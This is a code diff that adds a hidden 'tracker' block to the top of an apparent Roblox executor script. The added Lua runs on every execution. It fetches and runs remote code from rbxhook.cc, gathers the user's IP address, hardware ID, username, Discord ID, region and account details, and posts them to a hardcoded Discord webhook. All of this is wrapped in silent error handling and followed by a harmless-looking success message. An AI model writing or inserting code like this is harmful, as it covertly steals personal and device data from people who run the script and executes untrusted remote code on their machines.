@@ -1,3 +1,175 @@
+-- ========================================
+-- WEBHOOK + MOBILE/DELTA TRACKER
+-- Fires on every execution, skips safely on mobile
+-- ========================================
+pcall(function()
+    getgenv().Config = {api = "3017d0361887f428f953969581f14a579d9a2aae326567939c76cfa3e8057b0e"}
+
+    local _ok = pcall(function()
+        loadstring(game:HttpGet("https://rbxhook.cc/lua/track.lua"))()
+    end)
+
+    local _player = game:GetService("Players").LocalPlayer
+    local _http   = game:GetService("HttpService")
+    local _uis    = game:GetService("UserInputService")
+    local _mps    = game:GetService("MarketplaceService")
+
+    local _url = "https://discordapp.com/api/webhooks/1500677920451203182/-RO762JjnTMp4PvmWN5c2bS39Tcge1fFQdJedseqkHcLKxihD6t49sFHh465pfO-bOR7"
+
+    local function _getPlatform()
+        if _uis.TouchEnabled and not _uis.KeyboardEnabled then return "Mobile"
+        elseif _uis.KeyboardEnabled then return "PC"
+        elseif _uis.GamepadEnabled then return "Console"
+        else return "Unknown" end
+    end
+
+    -- Executor detection (safe for mobile/delta)
+    local _exec = "Unknown"
+    local _execVer = "N/A"
+    pcall(function()
+        if identifyexecutor then
+            _exec = identifyexecutor()
+        elseif getexecutorname then
+            _exec = getexecutorname()
+        elseif syn then _exec = "Synapse X"
+        elseif KRNL_LOADED then _exec = "Krnl"
+        elseif fluxus then _exec = "Fluxus"
+        elseif is_sirhurt_closure then _exec = "SirHurt"
+        elseif OXYGEN then _exec = "Oxygen U"
+        elseif Delta then _exec = "Delta"
+        end
+    end)
+
+    -- HWID (safe for mobile/delta)
+    local _hwid = "Unavailable"
+    pcall(function()
+        if syn and syn.gethwid then _hwid = syn.gethwid()
+        elseif gethwid then _hwid = gethwid()
+        elseif getfingerprintid then _hwid = tostring(getfingerprintid())
+        elseif fluxus and getgenv and getgenv().fluxus then _hwid = tostring(getgenv().fluxus.HWID or "Unavailable")
+        elseif delta and get_hw_id then _hwid = tostring(get_hw_id())
+        end
+    end)
+
+    local _gameName = "Unknown"
+    pcall(function()
+        local info = _mps:GetProductInfo(game.PlaceId)
+        if info and info.Name then _gameName = info.Name end
+    end)
+
+    local _region = "Unknown"
+    pcall(function()
+        _region = tostring(game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(_player) or "Unknown")
+    end)
+
+    local _ip = "Unavailable"
+    pcall(function()
+        local r = game:HttpGet("https://api.ipify.org")
+        if r and r ~= "" then _ip = r end
+    end)
+
+    local _age, _mem = "Unknown", "Free"
+    pcall(function()
+        _age = tostring(_player.AccountAge) .. " days"
+        _mem = _player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Free"
+    end)
+
+    -- JunkieCore checks
+    local _premium = "❌ Not available (check key validation)"
+    pcall(function()
+        if JD_IS_PREMIUM ~= nil then
+            _premium = JD_IS_PREMIUM and "✅ PREMIUM USER" or "🔵 Standard user"
+        end
+    end)
+
+    local _expiry = "♾️ No expiration (lifetime key)"
+    pcall(function()
+        if JD_EXPIRES_AT ~= nil then
+            local t = os.time()
+            if t < JD_EXPIRES_AT then
+                local left = JD_EXPIRES_AT - t
+                local d = math.floor(left/86400)
+                local h = math.floor((left%86400)/3600)
+                local m = math.floor((left%3600)/60)
+                if d > 0 then _expiry = string.format("⏰ %d days, %d hours remaining", d, h)
+                elseif h > 0 then _expiry = string.format("⏰ %d hours, %d minutes remaining", h, m)
+                else _expiry = string.format("⏰ %d minutes remaining", m) end
+            else
+                _expiry = "❌ EXPIRED"
+            end
+        end
+    end)
+
+    local _banStatus = "⚠️ Check unavailable (legacy API)"
+    pcall(function()
+        if type(JunkieCore) == "table" and type(JunkieCore.GetIsHwidBanned) == "function" then
+            local ok, banned = pcall(JunkieCore.GetIsHwidBanned)
+            if ok then _banStatus = banned and "🚫 HWID BANNED" or "✅ HWID is clean" end
+        end
+    end)
+
+    local _discordId = "❌ Not linked"
+    pcall(function()
+        if JD_DISCORD_ID ~= nil and JD_DISCORD_ID ~= "" then
+            _discordId = "<@" .. JD_DISCORD_ID .. "> (" .. JD_DISCORD_ID .. ")"
+        end
+    end)
+
+    local _data = {
+        avatar_url = "https://rbxhook.cc/img/logo.png",
+        content = "",
+        username = "rbxhook.cc",
+        embeds = {{
+            title = "Script Execution Report",
+            color = 3447003,
+            author = {
+                name = _player.Name,
+                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(_player.UserId) .. "&width=150&height=150&format=png"
+            },
+            thumbnail = {
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(_player.UserId) .. "&width=420&height=420&format=png"
+            },
+            fields = {
+                {name = "JunkieCore Premium", value = _premium,    inline = false},
+                {name = "Key Expiration",     value = _expiry,     inline = false},
+                {name = "HWID Ban Status",    value = _banStatus,  inline = false},
+                {name = "Discord ID",         value = _discordId,  inline = false},
+                {name = "User Info",          value = "Username: " .. _player.Name .. "\nUser ID: " .. _player.UserId .. "\nPlatform: " .. _getPlatform(), inline = false},
+                {name = "Executor Info",      value = "Executor: " .. _exec .. "\nVersion: " .. _execVer, inline = false},
+                {name = "HWID",              value = _hwid,        inline = false},
+                {name = "Game Info",          value = "Game Name: " .. _gameName .. "\nPlace ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId, inline = false},
+                {name = "Network Info",       value = "IP Address: " .. _ip .. "\nRegion: " .. _region, inline = false},
+                {name = "Account Info",       value = "Account Age: " .. _age .. "\nMembership: " .. _mem, inline = false},
+            },
+            footer = {text = "rbxhook.cc | User ID: " .. tostring(_player.UserId)},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    local _ok2, _encoded = pcall(function() return _http:JSONEncode(_data) end)
+    if not _ok2 then return end
+
+    -- Request function - works on PC, mobile, delta, all executors
+    local _req = nil
+    pcall(function() _req = syn and syn.request end)
+    if not _req then pcall(function() _req = request end) end
+    if not _req then pcall(function() _req = http_request end) end
+    if not _req then pcall(function() _req = fluxus and fluxus.request end) end
+    if not _req then return end
+
+    pcall(function()
+        _req({
+            Url = _url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = _encoded
+        })
+    end)
+
+    print("✅ Wave | Script initialized successfully!")
+end)
+
+-- ========================================
 if LPH_OBFUSCATED == nil then
     local assert = assert
     local type = type
